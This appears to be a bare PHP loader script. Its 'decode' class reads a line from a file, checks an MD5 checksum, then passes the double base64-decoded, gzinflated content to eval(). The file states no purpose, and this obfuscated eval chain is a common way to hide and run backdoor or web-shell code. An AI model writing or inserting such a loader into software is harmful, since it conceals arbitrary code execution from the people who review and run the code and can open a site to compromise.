<?php
class decode{
private $a;
private $b;
	public function go($a,$d,$c){
		$b = file($a);
		$this->a = $b[$c];
		$this->b = $d;
		$this->e();
	}
	private function b64d($a){
		return base64_decode(base64_decode($a));
	}
	private function tx2($a,$b=0){
		$c = array(0,$this->b,32);
		if($b==0)$b=substr($a,$c[0],$c[1]);
		elseif($b==1)$b=substr($a,$c[0]+$c[1],$c[2]);
		else$b=substr($a,$c[1]+$c[2]);
		return $b;
	}
	private function e(){
		$data = $this->tx2($this->a).$this->tx2($this->a,2);
		if($this->tx2($this->a,1) == md5($data)){
			eval(gzinflate(trim($this->b64d($data))));
		}
		else{
			die('file error');
		}
	}
}
function a($b,$c=8,$d=1){
	$a =  new decode();
	$a->go($b,$c,$d);
}
?>